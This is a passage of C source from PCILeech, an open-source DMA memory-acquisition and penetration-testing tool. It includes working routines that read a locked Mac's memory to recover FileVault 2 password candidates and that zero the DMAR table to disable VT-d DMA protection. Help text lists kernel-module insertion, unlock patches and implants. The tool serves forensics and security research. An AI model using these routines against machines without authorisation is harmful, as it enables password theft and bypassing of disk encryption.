        0x88000000, 0x89000000, 0x8a000000, 0x8b000000, 0x8c000000, 0x8d000000, 0x8e000000, 0x8f000000
    };
    for(i = 0; i < sizeof(dwOffsets) / sizeof(DWORD); i++) {
        DeviceReadDMA(dwOffsets[i], 0x01000000, pb512M + dwOffsets[i] - 0x70000000, NULL);
    }
}

BOOL Extra_MacFVRecover_Analyze(_In_ PBYTE pb512M)
{
    DWORD i, o, dwCandidate;
    PBYTE pb;
    BOOL isFound = 0;
    const BYTE CONST_ZERO_32[32] = { 0 };
    BYTE pbLast[32];
    memset(pbLast, 0x00, 32);
    for(o = 0; o < 0x20000000; o += 0x1000) {
        pb = (PBYTE)(pb512M + o);
        if(*(PDWORD)pb != 0x30646870) { // signature "phd0"
            continue; // not correct signature -> skip this page.
        }
        dwCandidate = 0;
        for(i = 0x18; i < 0x800; i += 8) {
            if((*(PQWORD)(pb + i) & 0xff00ff00ff00ff00)) {
                break; // non ascii chars in qword block -> skip this page.
            }
            if(dwCandidate == 0) {
                if(!*(PQWORD)(pb + i)) {
                    continue; // empty block -> page is still a candidate.
                }
                if(0 == pb[i + 6]) {
                    break; // less than 4 chars in pwd candidate -> skip this page.
                }
                if(*(PQWORD)(pb + i) == 0x0043005f00520047) {
                    break; // known false positive starts with GR_C -> skip this page.
                }
                dwCandidate = i;
                continue;
            }
            if(0 == *(PQWORD)(pb + i)) {
                if(memcmp(pb + i, CONST_ZERO_32, 32)) {
                    break; // not 32 bytes of zero after pwd candidate -> skip this page.
                }
                // password candidate found!!!
                isFound = TRUE;
                if(memcmp(pbLast, pb + dwCandidate, 32)) { // duplicate removal
                    memcpy(pbLast, pb + dwCandidate, 32);
#ifdef _WIN32
                    printf("MAC_FVRECOVER: PASSWORD CANDIDATE: %S\n", (LPWSTR)(pb + dwCandidate));
#endif /* _WIN32 */
#ifdef LINUX
                    printf("MAC_FVRECOVER: PASSWORD CANDIDATE (hex8): %llx\n", *(PQWORD)(pb + dwCandidate));
#endif /* LINUX */
                }
                break;
            }
        }
    }
    return isFound;
}

VOID Extra_MacFVRecover_SetOutFileName()
{
    SYSTEMTIME st;
    if(ctxMain->cfg.szFileOut[0] == 0) {
        GetLocalTime(&st);
        _snprintf_s(
            ctxMain->cfg.szFileOut,
            MAX_PATH,
            _TRUNCATE,
            "pcileech-mac-fvrecover-%i%02i%02i-%02i%02i%02i.raw",
            st.wYear,
            st.wMonth,
            st.wDay,
            st.wHour,
            st.wMinute,
            st.wSecond);
    }
}

VOID Action_MacFilevaultRecover(_In_ BOOL IsRebootRequired)
{
    FILE *pFile = NULL;
    PBYTE pbBuffer512M;
    // Allocate 512 MB buffer
    if(!(pbBuffer512M = LocalAlloc(LMEM_ZEROINIT, 0x20000000))) {
        printf("MAC_FVRECOVER: FAILED. Unable to allocate memory.\n");
        return;
    }
    if(IsRebootRequired) {
        // Wait for target computer reboot (device will power cycle).
        printf(
            "MAC_FVRECOVER: WAITING ... please reboot ...\n" \
            "  Please force a reboot of the mac by pressing CTRL+CMD+POWER\n" \
            "  WARNING! This will not work in macOS Sierra 10.12.2 and later.\n");
        Util_WaitForPowerCycle();
    } else {
        // Wait for DMA read access to target computer.
        printf("MAC_FVRECOVER: WAITING for DMA access ...\n");
        Util_WaitForPowerOn();
    }
    // Try read 512M of memory from in the range: [0x70000000..0x90000000[.
    printf("MAC_FVRECOVER: Continuing ...\n");
    Extra_MacFVRecover_ReadMemory_Optimized(pbBuffer512M);
    // Try write to disk image.
    printf("MAC_FVRECOVER: Writing partial memory contents to file ...\n");
    Extra_MacFVRecover_SetOutFileName();
    if(!fopen_s(&pFile, ctxMain->cfg.szFileOut, "r") || pFile) {
        printf("MAC_FVRECOVER: Error writing partial memory contents to file. File exists.\n");
        if(pFile) { fclose(pFile); }
        pFile = NULL;
    } else if(fopen_s(&pFile, ctxMain->cfg.szFileOut, "wb") || !pFile) {
        printf("MAC_FVRECOVER: Error writing partial memory contents to file.\n");
        pFile = NULL;
    }
    else if(0x20000000 != fwrite(pbBuffer512M, 1, 0x20000000, pFile)) {
        printf("MAC_FVRECOVER: Error writing partial memory contents to file.\n");
    } else {
        printf("MAC_FVRECOVER: File: %s.\n", ctxMain->cfg.szFileOut);
    }
    // Analyze for possible password candidates.
    printf("MAC_FVRECOVER: Analyzing ...\n");
    if(Extra_MacFVRecover_Analyze(pbBuffer512M)) {
        printf("MAC_FVRECOVER: Completed.\n");
    } else {
        printf("MAC_FVRECOVER: Failed.\n");
    }
    // clean up.
    LocalFree(pbBuffer512M);
    if(pFile) { fclose(pFile); }
}

VOID Action_MacDisableVtd()
{
    PBYTE pb16M;
    BYTE ZERO16[16] = { 0 };
    DWORD i, j, dwAddress, dwOffsets[] = {
        0x8a000000, 0x8b000000, 0x8c000000, 0x8d000000, 0x89000000, 0x88000000, 0x87000000, 0x86000000
    };
    // Allocate 16 MB buffer
    if(!(pb16M = LocalAlloc(LMEM_ZEROINIT, 0x01000000))) {
        printf("MAC_DISABLE_VTD: FAILED. Unable to allocate memory.\n");
        return;
    }
    // Wait for DMA read access to target computer.
    printf("MAC_DISABLE_VTD: WAITING for DMA access ...\n");
    Util_WaitForPowerOn();
    // DMAR table assumed to be on page boundary. This doesn't have to be true,
    // but it seems like it is on the MACs.
    for(i = 0; i < sizeof(dwOffsets) / sizeof(DWORD); i++) {
        if(DeviceReadDMA(dwOffsets[i], 0x01000000, pb16M, NULL)) {
            for(j = 0; j < 0x01000000; j += 0x1000) {
                if(*(PQWORD)(pb16M + j) == 0x0000008852414d44) {
                    dwAddress = dwOffsets[i] + j;
                    if(LcWrite(ctxMain->hLC, dwAddress, 16, ZERO16)) {
                        printf("MAC_DISABLE_VTD: VT-d DMA protections should now be disabled ...\n");
                        printf("MAC_DISABLE_VTD: DMAR ACPI table found and removed at: 0x%08x\n", dwAddress);
                        LocalFree(pb16M);
                        return;
                    }
                }
            }
        }
    }
    LocalFree(pb16M);
    printf("MAC_DISABLE_VTD: Failed to disable VT-d DMA protections.\n");
}

VOID Action_PT_Phys2Virt()
{
    BOOL result;
    QWORD qwVA, qwPTE, qwPDE, qwPDPTE, qwPML4E;
    printf("PT_PHYS2VIRT: searching ... (this may take some time).\n");
    result = Util_PageTable_FindMappedAddress(ctxMain->cfg.paCR3, ctxMain->cfg.qwDataIn[0], &qwVA, &qwPTE, &qwPDE, &qwPDPTE, &qwPML4E);
    if(result) {
        printf("PT_PHYS2VIRT: finished.\n");
        printf("          0x00000000FFFFFFFF\n");
        printf("   PA:    0x%016llx\n", ctxMain->cfg.qwDataIn[0]);
        printf("   VA:    0x%016llx\n", qwVA);
        printf("   PTE:   0x%016llx\n", qwPTE);
        printf("   PDE:   0x%016llx\n", qwPDE);
        printf("   PDPTE: 0x%016llx\n", qwPDPTE);
        printf("   PML4E: 0x%016llx\n", qwPML4E);
    } else {
        printf("PT_PHYS2VIRT: Failed.\n");
    }
}

VOID Action_PT_Virt2Phys()
{
    BOOL result;
    QWORD qwPA, qwPageBase, qwPageSize;
    result = Util_PageTable_Virtual2Physical(ctxMain->cfg.paCR3, ctxMain->cfg.qwDataIn[0], &qwPA, &qwPageBase, &qwPageSize);
    if(result) {
        printf("PT_VIRT2PHYS: Successful.\n");
        printf("               0x00000000FFFFFFFF\n");
        printf("   VA:         0x%016llx\n", ctxMain->cfg.qwDataIn[0]);
        printf("   PA:         0x%016llx\n", qwPA);
        printf("   PG SIZE:    0x%016llx\n", qwPageSize);
        printf("   PG BASE PA: 0x%016llx\n", qwPageBase);
        printf("   CR3/PML4:   0x%016llx\n", ctxMain->cfg.paCR3);
    } else {
        printf("PT_VIRT2PHYS: Failed.\n");
    }
}

VOID Action_TlpTx()
{
    DWORD dwListenTlpMs = 100;
    if(ctxMain->cfg.cbIn < 12) {
        printf("Action_TlpTx: Invalid TLP (too short).\n");
        return;
    }
    if(ctxMain->cfg.cbIn % 4) {
        printf("Action_TlpTx: Invalid TLP (length not multiple of 4).\n");
        return;
    }
    printf("TLP: Transmitting PCIe TLP.%s\n", ctxMain->cfg.fVerboseExtra ? "" : " (use -vvv option for detailed info).");
    if(ctxMain->cfg.fLoop) {
        printf("TLP: Starting loop TLP transmit. Press CTRL+C to abort.\n");
        while(TRUE) {
            LcCommand(ctxMain->hLC, LC_CMD_FPGA_WRITE_TLP, (DWORD)ctxMain->cfg.cbIn, ctxMain->cfg.pbIn, NULL, NULL);
            LcCommand(ctxMain->hLC, LC_CMD_FPGA_LISTEN_TLP, sizeof(DWORD), (PBYTE)&dwListenTlpMs, NULL, NULL);
        }
        return;
    }
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_WRITE_TLP, (DWORD)ctxMain->cfg.cbIn, ctxMain->cfg.pbIn, NULL, NULL);
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_LISTEN_TLP, sizeof(DWORD), (PBYTE)&dwListenTlpMs, NULL, NULL);
}

VOID Action_TlpTxLoop()
{
    WORD wTxSleep = 64, wValid = 0;
    DWORD dwMax = 0xffffffff, dwListenTlpMs = 100, dwEnableTx = 0x00080008, dwDisableTx = 0x00080000;
    QWORD i, qwFpgaVersionMajor = 0, qwFpgaVersionMinor = 0;
    if(ctxMain->cfg.cbIn < 12) {
        printf("Action_TlpTxLoop: Invalid TLP (too short).\n");
        return;
    }
    if(ctxMain->cfg.cbIn > 48) {
        printf("Action_TlpTxLoop: Invalid TLP (too long).\n");
        return;
    }
    if(ctxMain->cfg.cbIn % 4) {
        printf("Action_TlpTxLoop: Invalid TLP (length not multiple of 4).\n");
        return;
    }
    LcGetOption(ctxMain->hLC, LC_OPT_FPGA_VERSION_MAJOR, &qwFpgaVersionMajor);
    LcGetOption(ctxMain->hLC, LC_OPT_FPGA_VERSION_MINOR, &qwFpgaVersionMinor);
    if((qwFpgaVersionMajor < 4) || ((qwFpgaVersionMajor == 4) && (qwFpgaVersionMajor < 2))) {
        printf("Action_TlpTxLoop: FPGA version not supported (bitstream v4.2 or later required).\n");
        return;
    }
    printf("TLP: Transmitting PCIe LOOP TLPs. Press any key to stop.%s\n", ctxMain->cfg.fVerboseExtra ? "" : " (use -vvv option for detailed info).");
    // tx each 64 clk [66MHz - 15ns clk] (15ns * 64 -> ~1uS)
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE | 0x801e, sizeof(WORD), (PBYTE)&wTxSleep, NULL, NULL);
    // tlp value
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE | 0x8020, (DWORD)ctxMain->cfg.cbIn, ctxMain->cfg.pbIn, NULL, NULL);
    // set "infinite" [very long] loop
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE | 0x8050, sizeof(DWORD), (PBYTE)&dwMax, NULL, NULL);
    // set valid TLP QWORDs
    i = ctxMain->cfg.cbIn;
    wValid = 1 | ((i % 8) ? 0 : 2);
    i -= (i % 8) ? 4 : 8;
    while(i) {
        i -= 8;
        wValid = 2 | (wValid << 2);
    }
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE | 0x801c, sizeof(WORD), (PBYTE)&wValid, NULL, NULL);
    // start tx
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE_MARKWR | 0x8002, sizeof(DWORD), (PBYTE)&dwEnableTx, NULL, NULL);
    // wait for keypress to stop
    while(!_kbhit()) {
        LcCommand(ctxMain->hLC, LC_CMD_FPGA_LISTEN_TLP, sizeof(DWORD), (PBYTE)&dwListenTlpMs, NULL, NULL);
    }
    // stop
    LcCommand(ctxMain->hLC, LC_CMD_FPGA_CFGREGPCIE_MARKWR | 0x8002, sizeof(DWORD), (PBYTE)&dwDisableTx, NULL, NULL);
}

/*
* Read/Write to FPGA PCIe shadow configuration space.
*/
VOID Action_RegCfgReadWrite()
{
    BOOL fResult;
    FILE *pFile = NULL;
    PBYTE pbLcCfgSpace4096 = NULL;
    if(ctxMain->cfg.cbIn) {
        // WRITE mode:
        if((ctxMain->cfg.paAddrMin > 0x1000) || (ctxMain->cfg.paAddrMin + ctxMain->cfg.cbIn > 0x1000)) {
            printf("REGCFG: Write failed outside FPGA PCIe shadow configuration space (0x1000).\n");
            return;
        }
        fResult = LcCommand(
            ctxMain->hLC,
            LC_CMD_FPGA_CFGSPACE_SHADOW_WR | ctxMain->cfg.paAddrMin,
            (DWORD)ctxMain->cfg.cbIn,
            ctxMain->cfg.pbIn,
            NULL,
            NULL
        );
        if(fResult) {
            printf("REGCFG: Write SUCCESS!\n");
        } else {
            printf("REGCFG: Write to FPGA PCIe shadow configuration space failed.\n");
        }
        return;
    }
    // READ mode:
    fResult = LcCommand(
        ctxMain->hLC,
        LC_CMD_FPGA_CFGSPACE_SHADOW_RD,
        0,
        NULL,
        &pbLcCfgSpace4096,
        NULL
    );
    if(!fResult) {
        printf("REGCFG: Read FPGA PCIe shadow configuration space failed.\n");
        return;
    }
    // READ success:
    if(ctxMain->cfg.szFileOut[0]) {
        // open output file
        if(!fopen_s(&pFile, ctxMain->cfg.szFileOut, "r") || pFile) {
            printf("REGCFG: Error writing output to file. File already exists: %s\n", ctxMain->cfg.szFileOut);
            goto fail;
        }
        if(fopen_s(&pFile, ctxMain->cfg.szFileOut, "wb") || !pFile) {
            printf("REGCFG: Error writing output to file.\n");
            goto fail;
        }
        if(0x1000 != fwrite(pbLcCfgSpace4096, 1, 0x1000, pFile)) {
            printf("REGCFG: Error writing output to file.\n");
            goto fail;
        }
        printf("REGCFG: Wrote %i bytes to file %s.\n", 0x1000, ctxMain->cfg.szFileOut);
    }
    if(ctxMain->cfg.paAddrMin < 0x1000) {
        // print to screen
        printf("REGCFG: Please see result below: \n================================ \n");
        if((ctxMain->cfg.paAddrMin > ctxMain->cfg.paAddrMax) || (ctxMain->cfg.paAddrMax > 0xfff)) {
            ctxMain->cfg.paAddrMax = 0xfff;
        }
        Util_PrintHexAscii(
            pbLcCfgSpace4096,
            (DWORD)(ctxMain->cfg.paAddrMax + 1),
            (DWORD)ctxMain->cfg.paAddrMin
        );
    }
fail:
    if(pFile) { fclose(pFile); }
    LcMemFree(pbLcCfgSpace4096);
}

```

`pcileech/extra.h`:

```h
// extra.h : definitions related to various extra functionality such as exploits.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __EXTRA_H__
#define __EXTRA_H__
#include "pcileech.h"
#include "kmd.h"

/*
* Recover the Filevault 2 password on locked macOS systems prior to 10.12.2.
* (IsRebootRequired = TRUE).
* Also recover the Filevault 2 password just after user filevault unlock on
* some macs prior to 10.XX.YY (IsRebootRequired = FALSE).
* -- IsRebootRequired
*/
VOID Action_MacFilevaultRecover(_In_ BOOL IsRebootRequired);

/*
* Try to disable VT-d on a mac in the short time window that exists after EFI
* drops VT-d DMA protections and before macOS enables them again. If successful
* the DMAR ACPI table will be zeroed out - resulting in macOS not enabling VT-d
* DMA protections. This works on macs prior to 10.XX.YY
*/
VOID Action_MacDisableVtd();

/*
* Search for the virtual address that maps to a physical address given a page table base.
*/
VOID Action_PT_Phys2Virt();

/*
* Search for the physical address that is mapped by a virtual address given a page table base.
*/
VOID Action_PT_Virt2Phys();

/*
* Transmit the TLP data specified in the -in parameter.
*/
VOID Action_TlpTx();

/*
* Transmit TLPs in a hardware-assisted loop using on-board fpga logic.
*/
VOID Action_TlpTxLoop();

/*
* Read/Write to FPGA PCIe shadow configuration space.
*/
VOID Action_RegCfgReadWrite();

#endif /* __EXTRA_H__ */

```

`pcileech/help.c`:

```c
// help.c : implementation related to displaying help texts.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "help.h"
#include "util.h"
#include "version.h"

VOID ShowListFiles(_In_ LPSTR szSearchPattern, _In_ DWORD cchSpaces, _In_ DWORD cchPre, _In_ DWORD cchPost)
{
    WIN32_FIND_DATAA data;
    HANDLE h;
    CHAR szSearch[MAX_PATH];
    Util_GetFileInDirectory(szSearch, szSearchPattern);
    h = FindFirstFileA(szSearch, &data);
    while(h != INVALID_HANDLE_VALUE) {
        data.cFileName[strlen(data.cFileName) - cchPost] = 0;
        if(!cchPre || !memcmp(data.cFileName, szSearchPattern, cchPre)) {
            printf("%*c%s\n", cchSpaces, ' ', data.cFileName + cchPre);
        }
        if(!FindNextFileA(h, &data)) {
            return;
        }
    }
}

VOID Help_ShowGeneral()
{
    printf(
        " PCILEECH COMMAND LINE REFERENCE                                               \n" \
        " PCILeech can run in two modes - NATIVE (default), Kernel Module Assisted (KMD)\n" \
        " KMD mode may be triggered by supplying the option kmd and optionally cr3 / pt.\n" \
        " If an address is supplied in the kmd option pcileech will use the already ins-\n" \
        " erted KMD. The already inserted KMD will be left intact upon exit.  If the KMD\n" \
        " contains a kernel mode signature the kernel module will be loaded and then un-\n" \
        " loaded on program exit ( except for the kmdload command ).                    \n" \
        " KMD mode may access all memory (available to the kernel of the target system).\n" \
        " NATIVE mode may access 4GB memory if USB3380 hardware is used.                \n" \
        " NATIVE mode may access all memory if FPGA based hardware is used such as the: \n" \
        "   SP605/FT601, AC701/FT601 and PCIeScreamer. This mode also works for software\n" \
        "   based acquisition methods such as Files, DumpIt, WinPmem or any other method\n" \
        "   supported by the LeechCore library. For more information check out:         \n" \
        "   https://github.com/ufrisk/PCILeech and  https://github.com/ufrisk/LeechCore \n" \
        " For detailed help about a specific command type:  pcileech <command> -help    \n" \
        " General syntax: pcileech <command> [-<optionname1> <optionvalue1>] ...        \n" \
        " VALID COMMANDS           MODEs        [ OPTIONS ]    (REQUIREMENTS)           \n" \
        "   info                   NATIVE,KMD                                           \n" \
        "   dump                   NATIVE,KMD [ min, max, out ]                         \n" \
        "   patch                  NATIVE,KMD [ min, max, sig, all, pid,vamin,vamax ]   \n" \
        "   write                  NATIVE,KMD [ min, in ]                               \n" \
        "   search                 NATIVE,KMD [ min, max, sig, in, all, pid,vamin,vamax]\n" \
        "   [implant]                     KMD [ in, out, s, 0..9 ]                      \n" \
        "   kmdload                NATIVE     [ pt, cr3 ]                               \n" \
        "   kmdexit                       KMD                                           \n" \
        "   mount                  NATIVE,KMD [ mount, cr3 ]                            \n" \
        "   display                NATIVE,KMD [ min, max, pid,vamin,vamax ]             \n" \
        "   pagedisplay            NATIVE,KMD [ min, pid,vamin,vamax ]                  \n" \
        "   pt_phys2virt           NATIVE,KMD [ cr3, 0 ]                                \n" \
        "   pt_virt2phys           NATIVE,KMD [ cr3, 0 ]                                \n" \
        "   testmemread            NATIVE     [ min ]                                   \n" \
        "   testmemreadwrite       NATIVE     [ min ]                                   \n" \
        " Device specific commands and valid MODEs [ and options ] (and device):        \n" \
        "   tlp                    NATIVE     [ in ]         (FPGA)                     \n" \
        "   tlploop                NATIVE     [ in ]         (FPGA)                     \n" \
        "   probe                  NATIVE     [ min, max ]   (FPGA)                     \n" \
        "   regcfg                 NATIVE     [ in, out, min, max] (FPGA)               \n" \
        "   pslist                 NATIVE                                               \n" \
        "   psvirt2phys            NATIVE     [ 0, 1 ]                                  \n" \
        "   agent-execpy           NATIVE     [ in, out ]    (Remote LeechAgent)        \n" \
        "   agent-forensic         NATIVE     [ out ]        (Remote LeechAgent)        \n" \
        " System specific commands and valid MODEs [ and options ]:                     \n" \
        "   mac_fvrecover          NATIVE                    (USB3380)                  \n" \
        "   mac_fvrecover2         NATIVE                    (USB3380)                  \n" \
        "   mac_disablevtd         NATIVE                    (USB3380)                  \n" \
        " External plugin commands:                                                     \n");
    ShowListFiles("leechp_*"PCILEECH_LIBRARY_FILETYPE, 3, 7, (DWORD)strlen(PCILEECH_LIBRARY_FILETYPE));
    printf(
        " Valid options:                                                                \n" \
        "   -device: The memory acquisition device to including config options in the   \n" \
        "          device connection string. If option is not given the USB3380 and FPGA\n" \
        "          will be auto-detected. For a complete list of supported devices and  \n" \
        "          their individual config options check out the documentation for the  \n" \
        "          LeechCore library at: https://github.com/ufrisk/LeechCore            \n" \
        "          Affects all modes and commands.                                      \n" \
        "          Common valid options: USB3380, FPGA, DumpIt, <memory-dump-file-name> \n" \
        "   -remote: Connect to a remote system LeechAgent to acquire remote memory.    \n" \
        "          This is a Windows-only feature. Specify remote host + remote user to \n" \
        "          authenticate (or insecure if no authenciation). Kerberos-secure conn.\n" \
        "          Example: rpc://<remote-user-spn_or_insecure>:<remote_host>           \n" \
        "   -min : memory min address, valid range: 0x0 .. 0xffffffffffffffff           \n" \
        "          default: 0x0                                                         \n" \
        "   -max : memory max address, valid range: 0x0 .. 0xffffffffffffffff           \n" \
        "          default: <max supported by device> (FPGA = no limit, USB3380 = 4GB)  \n" \
        "   -out : name of output file.                                                 \n" \
        "          default: pcileech-<minaddr>-<maxaddr>-<date>-<time>.raw              \n" \
        "          No output file will be created if parameter is set to none or null.  \n" \
        "   -all : search all memory for signature - do not stop at first occurrence.   \n" \
        "          Option has no value. Example: -all                                   \n" \
        "   -pid : windows process id for virtual address mode for select commands.     \n" \
        "          Option has no default value. Example: -pid 4                         \n" \
        "   -vamin: virtual memory min address for select commands. Require -pid option.\n" \
        "          default: 0. Example: -vamin 0x10000                                  \n" \
        "   -vamax: virtual memory max address for select commands. Require -pid option.\n" \
        "          default: 0xffffffffffffffff. Example: -vamax 0x7fffffffffff          \n" \
        "   -v   : verbose option. Additional information is displayed in the output.   \n" \
        "          Affects all modes and commands. Option has no value. Example: -v     \n" \
        "   -vv  : extra verbose option. More detailed additional information is shown  \n" \
        "          in output. Option has no value. Example: -vv                         \n" \
        "   -vvv : super verbose option. Show all data transferred such as PCIe TLPs.   \n" \
        "          Option has no value. Example: -vvv                                   \n" \
        "   -force: force reads and writes even though target memory is marked as not   \n" \
        "          accessible. Dangerous! Affects all modes and commands.               \n" \
        "          Option has no value. Example: -force                                 \n" \
        "   -tlpwait: Wait in seconds while listening for PCIe TLPs.                    \n" \
        "          Wait occurs after any other actions have been completed.             \n" \
        "   -help: show help about the selected command or implant and then exit        \n" \
        "          without running the command. Affects all modes and commands.         \n" \
        "          Option has no value. Example: -help                                  \n" \
        "   -hook: Where to place a hook. In case of IAT hooking (UMD*IAT*) specify as: \n" \
        "          <imported-module>!<function-to-hook> Example: msvcrt.dll!memcpy      \n" \
        "   -in  : file name or hexstring to load as input.                             \n" \
        "          Examples: -in 0102030405060708090a0b0c0d0e0f or -in firmware.bin     \n" \
        "   -s   : string input value.                                                  \n" \
        "          Example: -s \"\\\\??\\C:\\Windows\\System32\\cmd.exe\"               \n" \
        "   -mount : custom mount drive (Windows) or mount path (Linux)                 \n" \
        "          Only used in conjunction with the mount command.                     \n" \
        "          Examples: (Windows) -mount Q         (Linux) -mount /mnt/pcileech    \n" \
        "   -0..9: QWORD input value. Example: -0 0xff , -3 0x7fffffff00001000 or -2 13 \n" \
        "          default: 0                                                           \n" \
        "   -pt  : trigger KMD insertion by automatic page table hijack.                \n" \
        "          Option has no value. Example: -pt. Used in conjunction with          \n" \
        "          -kmd option to trigger KMD insertion by page table hijack.           \n" \
        "   -cr3 : base address of page table (PML4) / CR3 CPU register.                \n" \
        "   -efibase : base address of EFI table when inserting select kernel modules.  \n" \
        "          EFI_SYSTEM_TABLE(IBI SYST) == UEFI ; RUNTSERV == LINUX RUNTSERV EFI. \n" \
        "   -memmap : specify a physical memory map given in a file or specify 'auto'.  \n" \
        "          to use MemProcFS (Windows required on target&host)                   \n" \
        "          example: -memmap c:\\temp\\my_custom_memory_map.txt                  \n" \
        "          example: -memmap auto                                                \n" \
        "   -kmd : address of already loaded kernel module helper (KMD).                \n" \
        "          ALTERNATIVELY                                                        \n" \
        "          kernel module to use, see list below for choices:                    \n" \
        "             WIN10_X64                                                         \n" \
        "             WIN10_X64_2                                                       \n" \
        "             WIN10_X64_3                                                       \n" \
        "             LINUX_X64_46        (NB! Kernels 2.6.33 - 4.6)                    \n" \
        "             LINUX_X64_48        (NB! Kernels 4.8+)                            \n" \
        "             LINUX_X64_EFI       (NB! UEFI booted systems only)                \n" \
        "             FREEBSD_X64                                                       \n" \
        "             MACOS                                                             \n" \
        "             UEFI_EXIT_BOOT_SERVICES                                           \n" \
        "             UEFI_SIGNAL_EVENT                                                 \n");
    ShowListFiles("*.kmd", 13, 0, 4);
    printf(
        "   -sig : available patches - including operating system unlock patches:       \n");
    ShowListFiles("*.sig", 13, 0, 4);
    printf(
        " User-Mode implants: EXPERIMENTAL!                                             \n" \
        "             UMD_WINX64_IAT_PSEXEC                                             \n" \
        " Kernel-mode implants:                                                         \n");
    ShowListFiles("*.ksh", 13, 0, 4);
    printf("\n");
}

VOID Help_ShowInfo()
{
    printf(
        " PCILEECH INFORMATION                                                          \n" \
        " PCILeech (c) 2016-2022 Ulf Frisk                                              \n" \
        " Version: " \
        VER_FILE_VERSION_STR "\n" \
        "                                                                               \n" \
        " License: GNU Affero General Public License v3.0                               \n" \
        " Contact information: pcileech@frizk.net                                       \n" \
        " System requirements: 64-bit Windows 10, 11 or Linux.                          \n" \
        " Other project references:                                                     \n" \
        "   PCILeech          - https://github.com/ufrisk/pcileech                      \n" \
        "   PCILeech-FPGA     - https://github.com/ufrisk/pcileech-fpga                 \n" \
        "   LeechCore         - https://github.com/ufrisk/LeechCore                     \n" \
        "   MemProcFS         - https://github.com/ufrisk/MemProcFS                     \n" \
        "   Google USB Driver - https://developer.android.com/sdk/win-usb.html          \n" \
        "   FTDI FT601 Driver - http://www.ftdichip.com/Drivers/D3XX.htm                \n" \
        "   PCIe Injector     - https://github.com/enjoy-digital/pcie_injector          \n" \
        "   Dokany            - https://github.com/dokan-dev/dokany/releases/latest     \n" \
        " ----------------                                                              \n" \
        "   PCILeech is free open source software. If you find it useful please         \n" \
        "   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)        \n" \
        " ----------------                                                              \n" \
        " Use with memory dump files, DumpIt, WinPmem in read-only mode.                \n" \
        " Use with USB3380 hardware programmed as a PCILeech device.                    \n" \
        " Use with FPGA harware programmed as a PCILeech FPGA device.                   \n\n" \
        " ----------------                                                              \n" \
        " Driver information (USB3380/Windows):                                         \n" \
        "   The USB3380 HW requires a dummy driver to function properly. The PCILeech   \n" \
        "   device masks as a Google Glass. Please download and install the Google USB  \n" \
        "   driver before proceeding by using the USB3380 device. USB3 is recommended   \n" \
        "   to performance reasons (USB2 will work but impact performance).             \n" \
        " Driver information (FPGA/FT601/Windows):                                      \n" \
        "   The PCILeech programmed FPGA board with FT601 USB3 requires drivers for USB.\n" \
        "   The drivers are on Windows update and is installed at first use.            \n" \
        "   PCILeech also requires the FTDI application library (DLL). Download DLL from\n" \
        "   FTDI web site and place the 64-bit FTD3XX.dll alongside pcileech.exe.       \n" \
        " Driver information (Dokany/Windows):                                          \n" \
        "   To be able to use the 'mount' functionality for filesystem browsing PCILeech\n" \
        "   requires Dokany to be installed for virtual file system support. Download   \n" \
        "   and install Dokany on your computer before using the mount functionality.   \n" \
        " Driver information (USB3380/Linux):                                           \n" \
        "   PCILeech on Linux requires that libusb is installed. Libusb is most probably\n" \
        "   installed by default, if not install by running:apt-get install libusb-1.0-0\n" \
        " Driver information (FPGA/FT601/Linux):                                        \n" \
        "   The PCILeech programmed FPGA board with FT601 USB3 requires drivers for USB.\n" \
        "   The driver is a small kernel driver found in the drivers/ft60x folder in the\n" \
        "   PCIe Injector Github repository. Once loaded the driver will expose a device\n" \
        "   named /dev/ft60x[0-3] Please note that this device file must be read/write  \n" \
        "   for the current user for PCILeech to find and use it automatically.         \n" \
        " ----------------                                                              \n" \
        " Notes about the PCILeech USB3380 device:                                      \n" \
        " Usage: connect USB3380 device to target computer and USB cable to the computer\n" \
        " executing pcileech. If all memory reads fail try to re-insert the device.     \n" \
        " - It is only possible to access the lower 4GB of RAM (32-bit) with DMA.       \n" \
        " - It may not be possible to access RAM if OS configured IOMMU (VT-d).         \n" \
        "   macOS defaults to VT-d. Windows 10 may, if configured, also use VT-d.       \n" \
        " - No drivers are needed on the target! Memory acquisition is all in hardware! \n" \
        " - Confirmed working with PCIe/mPCIe/ExpressCard/Thunderbolt.                  \n" \
        " - If kernel module is successfully inserted in lower 4GB RAM more RAM will be \n" \
        "   possible to read. Extended funtionality will also be made available.        \n" \
        " ----------------                                                              \n");
    Help_ShowGeneral();
}

VOID _HelpShowExecCommand()
{
    BOOL result;
    PKMDEXEC pKmdExec = NULL;
    result = Util_LoadKmdExecShellcode(ctxMain->cfg.szShellcodeName, &pKmdExec);
    if(!result) {
        printf("HELP: Failed loading shellcode from file: '%s.ksh' ...\n", ctxMain->cfg.szShellcodeName);
        return;
    }
    printf(
        " SHELLCODE IMPLANT HELP: Execute a custom implant in the target kernel.        \n" \
        " MODES   : KMD                                                                 \n" \
        " OPTIONS : -in, -out, -s, -0, -1, -2, -3, -4, -5, -6, -7, -8, -9               \n");
    printf(" Implant loaded from file: %s.ksh\n", ctxMain->cfg.szShellcodeName);
    printf(
        " Implant specific help (output values are left empty/set to zero):             \n" \
        " ============================================================================= \n");
    printf(pKmdExec->szOutFormatPrintf, "", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    LocalFree(pKmdExec);
}

VOID Help_ShowDetailed()
{
    switch(ctxMain->cfg.tpAction) {
    case DUMP:
        printf(
            " DUMP MEMORY FROM TARGET SYSTEM TO FILE.                                       \n" \
            " MODES   : NATIVE, KMD                                                         \n" \
            " OPTIONS : -min, -max, -out, -force                                            \n" \
            " The physical memory is dumped to file. If no file is specified in the -out    \n" \
            " option then a default named file is created. When dumping in NATIVE mode the  \n" \
            " max memory will be auto-detected (unless if the USB3380 hardware is used).    \n" \
            " When dumping in KMD mode readable physical memory accessible to the kernel is \n" \
            " dumped automatically. It is possible to override auto-detected sections with  \n" \
            " the -min and -max options. Unreadable memory will be zero-padded.             \n" \
            " Please note that using the -force option may result in a system crash.        \n" \
